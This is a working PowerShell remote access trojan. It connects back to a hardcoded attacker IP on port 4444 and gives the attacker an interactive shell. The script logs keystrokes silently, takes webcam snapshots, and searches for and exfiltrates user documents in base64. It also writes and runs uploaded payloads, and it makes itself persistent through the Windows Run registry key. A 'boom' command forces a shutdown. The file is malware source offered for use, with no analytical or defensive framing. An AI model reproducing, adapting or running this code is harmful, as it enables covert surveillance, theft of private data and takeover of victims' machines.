# --- [AWK] SILENT-SHADOW CLIENT Rollback ---
Add-Type -AssemblyName System.Windows.Forms, System.Drawing | Out-Null

# 1. CORE ENGINE CLASSES
$code = @"
using System; using System.Runtime.InteropServices; using System.Drawing; using System.Windows.Forms;
public class Engine {
    [DllImport("avicap32.dll")] public static extern IntPtr capCreateCaptureWindowA(string l, int s, int x, int y, int w, int h, IntPtr p, int i);
    [DllImport("user32.dll")] public static extern bool SendMessage(IntPtr h, uint m, int w, int l);
    [DllImport("user32.dll")] public static extern void keybd_event(byte b, byte s, uint f, UIntPtr e);
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);
    public static void Snap(string p) {
        IntPtr h = capCreateCaptureWindowA("V", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
        SendMessage(h, 0x40a, 0, 0); SendMessage(h, 0x41e, 0, 0); SendMessage(h, 0x41f, 0, 0); SendMessage(h, 0x40b, 0, 0);
        if (Clipboard.ContainsImage()) { Clipboard.GetImage().Save(p, System.Drawing.Imaging.ImageFormat.Jpeg); }
    }
}
"@
Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing, System.Windows.Forms -ErrorAction SilentlyContinue

# 2. SETTINGS
$AttackerIP = "192.168.18.177" # Verify this!
$AttackerPort = 4444
$global:Lock = $false
Set-Location "C:\"

try {
    $client = New-Object System.Net.Sockets.TCPClient($AttackerIP, $AttackerPort)
    $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true
    $reader = New-Object System.IO.StreamReader($stream)
    $writer.WriteLine("--- [AWK] Titan v9.5 Online: $env:COMPUTERNAME ---")

    while($client.Connected) {
        # --- KEYLOGGER (SILENT) ---
        if (!$global:Lock) {
            for($i=8;$i -le 254;$i++){
                if([Engine]::GetAsyncKeyState($i) -eq -32767){
                    $k=[char]$i; if($i -eq 13){$k="[ENT]"}
                    $writer.WriteLine("---K---"); $writer.WriteLine($k); $writer.WriteLine("---E---"); $writer.Flush()
                }
            }
        }

        if ($stream.DataAvailable) {
            $cmd = $reader.ReadLine(); if($cmd -eq $null){break}
            $output = ""
            $USBPath = ""; foreach($d in Get-PSDrive -PSProvider FileSystem){ if(Test-Path "$($d.Root).assets"){$USBPath="$($d.Root).assets"} }

            # --- DATA THEFT & ESPIONAGE ---
            if ($cmd -eq "find") {
                $output = Get-ChildItem -Path "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents" -Include *.pdf,*.docx,*.jpg,*.txt -Recurse -ErrorAction SilentlyContinue | Select-Object Name, FullName | Out-String
            }
            elseif ($cmd -like "pull *") {
                $global:Lock = $true
                $t = $cmd.Substring(5).Trim(); if(Test-Path $t){
                    $f = Get-Item $t
                    $writer.WriteLine("---START_FILE---"); $writer.WriteLine($f.Name)
                    $writer.WriteLine([Convert]::ToBase64String([IO.File]::ReadAllBytes($f.FullName)))
                    $writer.WriteLine("---END_FILE---"); $writer.Flush()
                    $output = "ACK: Exfiltrated $($f.Name)"
                } else { $output = "ERR: File not found" }
                $global:Lock = $false
            }
           elseif ($cmd -eq "snap") {
                try {
                    $snapPath = "$env:TEMP\sys_thumb.jpg"
                    $code = @"
                    using System; using System.Runtime.InteropServices; using System.Drawing; using System.Drawing.Imaging; using System.Windows.Forms;
                    public class Camera {
                        [DllImport("avicap32.dll")] public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, int nID);
                        [DllImport("user32.dll")] public static extern bool SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
                        public static void TakeSnapshot(string path) {
                            IntPtr hHwnd = capCreateCaptureWindowA("V", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
                            SendMessage(hHwnd, 0x40a, 0, 0); SendMessage(hHwnd, 0x41e, 0, 0); SendMessage(hHwnd, 0x41f, 0, 0); SendMessage(hHwnd, 0x40b, 0, 0);
                            if (Clipboard.ContainsImage()) { Clipboard.GetImage().Save(path, ImageFormat.Jpeg); }
                        }
                    }
"@
                    Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing, System.Windows.Forms
                    [Camera]::TakeSnapshot($snapPath)
                    if (Test-Path $snapPath) {
                        $writer.WriteLine("webcam_snap.jpg"); $writer.WriteLine("---B---")
                        $writer.WriteLine([Convert]::ToBase64String([IO.File]::ReadAllBytes($snapPath)))
                        $writer.WriteLine("---E---")
                        $output = "ACK: Snap Delivered"; Remove-Item $snapPath -Force
                    }
                } catch { $output = "ERR: Snap failed" }
            }

            # --- INFILTRATION & PERSISTENCE ---
            elseif ($cmd -eq "silent_put") {
                $global:Lock = $true
                $name = $reader.ReadLine(); $data = $reader.ReadLine()
                [IO.File]::WriteAllBytes("$env:TEMP\$name", [Convert]::FromBase64String($data))
                $output = "ACK: Infiltrated $name to Temp"
                $global:Lock = $false
            }
            elseif ($cmd -like "exec *") {
                $t = $cmd.Substring(5).Trim(); $p = "$env:TEMP\$t"; if(Test-Path $p){ Invoke-Item $p; $output = "ACK: Executed $t" }
            }
            elseif ($cmd -like "persist *") {
                $t = $cmd.Substring(8).Trim(); $p = "$env:TEMP\$t"
                if(Test-Path $p){
                    $v = if($p.EndsWith(".ps1")){"powershell.exe -W Hidden -Exp Bypass -File `"$p`""}else{"`"$p`""}
                    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "AWK_Titan" -Value $v
                    $output = "ACK: Persistence Enabled"
                }
            }

            # --- NAVIGATION & SYSTEM INFO ---
            elseif ($cmd -eq "ls") { $output = Get-ChildItem | Out-String }
            elseif ($cmd -like "cd *") { Set-Location $cmd.Substring(3).Trim(); $output = "Location: $((Get-Location).Path)" }
            elseif ($cmd -eq "pwd") { $output = (Get-Location).Path }
            elseif ($cmd -like "mkdir *") { New-Item -ItemType Directory -Path $cmd.Substring(6).Trim() | Out-Null; $output = "ACK: Folder Created" }
            elseif ($cmd -eq "whoami") { $output = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name }
            elseif ($cmd -eq "ipconfig") { $output = ipconfig | Out-String }
            elseif ($cmd -like "cat *") { $output = Get-Content $cmd.Substring(4).Trim() -Raw -ErrorAction SilentlyContinue }

            # --- HARDWARE ---
            elseif ($cmd -eq "audio") {
                1..50 | % { [Engine]::keybd_event(0xAF, 0, 0, [UIntPtr]::Zero) }
                $f = Join-Path $USBPath "theme.mp3"
                if(Test-Path $f){ (New-Object -ComObject WMPlayer.OCX).URL = $f; $output = "ACK: Playing Audio" }
            }
            elseif ($cmd -eq "boom") {
                $l = Join-Path $USBPath "logo.png"
                if(Test-Path $l){
                    $form = New-Object Windows.Forms.Form; $form.WindowState = "Maximized"; $form.TopMost = $true; $form.FormBorderStyle = "None"
                    $pb = New-Object Windows.Forms.PictureBox; $pb.Image = [Drawing.Image]::FromFile($l); $pb.Dock = "Fill"; $pb.SizeMode = "Zoom"
                    $form.Controls.Add($pb); $form.Show(); $form.Refresh(); Start-Sleep -Seconds 10
                }
                shutdown /s /t 5; break
            }
            elseif ($cmd -eq "exit") { break }
            else { try { $output = Invoke-Expression $cmd 2>&1 | Out-String } catch { $output = "ERR" } }

            $writer.WriteLine($output); $writer.WriteLine("PS_READY"); $writer.Flush()
        }
        Start-Sleep -Milliseconds 20
    }
} catch { } finally { if($client){$client.Close()} }